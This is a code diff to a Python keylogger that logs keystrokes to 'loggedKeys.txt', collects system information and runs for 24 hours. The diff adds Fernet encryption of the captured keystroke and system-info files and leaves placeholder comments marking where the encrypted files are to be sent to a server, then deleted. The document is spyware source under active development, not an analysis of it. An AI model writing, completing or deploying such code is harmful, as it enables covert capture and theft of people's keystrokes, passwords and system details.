@@ -11,7 +11,7 @@ import os
 import getpass
 from requests import get
 import multiprocessing
-
+from cryptography.fernet import Fernet
 
 
 loggedKeys = "loggedKeys.txt"
@@ -68,7 +68,7 @@ getSystemInfo()
 
 ### Run Length Variables ###
 numberOfLogs = 1
-logTime = 86400 #This should be changed to 24 hours equivalent (I think)
+logTime = 86400 #This should be 24 hours equivalent (I think)
 currentTime = time.time()
 endTime = currentTime + logTime #Will result in 24 hours after currentTime
 
@@ -131,15 +131,28 @@ while currentTime < endTime:
 
     
 ### ENCRYPT FILES HERE ###
-### ENCRYPT FILES HERE ###
-### ENCRYPT FILES HERE ###
-### ENCRYPT FILES HERE ###
-### ENCRYPT FILES HERE ###
-### ENCRYPT FILES HERE ###
-### ENCRYPT FILES HERE ###
-### ENCRYPT FILES HERE ###
-### ENCRYPT FILES HERE ###
-### ENCRYPT FILES HERE ###
+filesToEncrypt = [extendedPath + systemInfo, extendedPath + loggedKeys]
+encryptedFileNames = [extendedPath + systemInfoEncrypted, extendedPath + loggedKeysEncrypted]
+
+count = 0
+
+for encryptingFile in filesToEncrypt:
+
+    with open(filesToEncrypt[count], 'rb') as f:
+        data = f.read()
+
+    fernet = Fernet(key)
+    encrypted = fernet.encrypt(data)
+
+    with open(encryptedFileNames[count], 'wb') as f:
+        f.write(encrypted)
+
+    ### SEND ENCRYPTED FILES TO SERVER HERE ###
+    ### SEND ENCRYPTED FILES TO SERVER HERE ###
+    ### SEND ENCRYPTED FILES TO SERVER HERE ###
+    count += 1
+
+time.sleep(120)
 
 
 ### Deletes Files After they are Encrypted and Sent ###
